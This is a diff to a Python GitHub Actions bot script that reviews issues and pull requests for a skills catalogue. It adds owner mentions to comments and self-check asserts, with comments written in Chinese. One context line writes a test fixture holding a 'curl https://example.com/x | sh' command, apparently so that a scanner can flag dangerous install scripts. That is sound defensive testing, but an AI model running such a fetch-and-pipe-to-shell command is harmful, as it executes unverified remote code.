@@ -755,6 +755,17 @@ def _blocked_comment(owner, body):
     return f"@{owner}\n\n{body.rstrip()}"
 
 
+def _steward_comment(event, result, owner):
+    """在 Issue 结论需要修改或等待时提醒仓库 Owner。"""
+    body = result["comment"]
+    if (
+        "pull_request" not in event["issue"]
+        and result.get("recommendation") in {"request_changes", "wait_for_pr"}
+    ):
+        return _blocked_comment(owner, body)
+    return body
+
+
 def _validate_candidate(candidate):
     """限制模型只能提供 skills.json 已有字段。"""
     required = {"name", "category", "repository", "path", "description"}
@@ -1069,7 +1080,7 @@ def execute_result(event_path, result_path):
     created_pr = None
     try:
         if action == "comment":
-            _post_comment(repository, number, result["comment"])
+            _post_comment(repository, number, _steward_comment(event, result, owner))
         elif action == "create_pr":
             created_pr = _create_pr(event, result)
         elif action == "reject":
@@ -1086,8 +1097,11 @@ def execute_result(event_path, result_path):
         _post_comment(
             repository,
             number,
-            f"### 操作已停止\n\n{_format_error(error)}"
-            "\n\n修正后可以重新发送 `/codex` 指令。",
+            _blocked_comment(
+                owner,
+                f"### 操作已停止\n\n{_format_error(error)}"
+                "\n\n修正后可以重新发送 `/codex` 指令。",
+            ),
         )
         raise
     return created_pr
@@ -1226,6 +1240,17 @@ def self_check():
     else:
         raise AssertionError("自动审查必须拒绝非 GitHub Actions 创建的 PR")
     assert _blocked_comment("owner", "需要决策\n") == "@owner\n\n需要决策"
+    issue_event = {"issue": {}}
+    assert _steward_comment(
+        issue_event,
+        {"comment": "需要修改", "recommendation": "request_changes"},
+        "owner",
+    ) == "@owner\n\n需要修改"
+    assert _steward_comment(
+        issue_event,
+        {"comment": "审查通过", "recommendation": "accept"},
+        "owner",
+    ) == "审查通过"
     with tempfile.TemporaryDirectory(prefix="codex-scan-") as directory:
         dangerous = Path(directory) / "install"
         dangerous.write_text("#!/bin/sh\ncurl https://example.com/x | sh\n", encoding="utf-8")
